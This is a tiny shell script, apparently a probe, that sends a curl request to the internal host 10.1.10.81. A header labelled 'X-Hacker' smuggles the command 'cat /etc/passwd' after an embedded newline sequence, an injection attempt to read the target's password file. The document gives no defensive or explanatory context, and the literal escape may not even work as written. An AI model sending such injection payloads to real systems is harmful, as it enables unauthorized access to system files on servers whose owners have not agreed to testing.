#!/bin/sh
curl -H "X-Hacker:I am bad\ncat /etc/passwd" http://10.1.10.81/
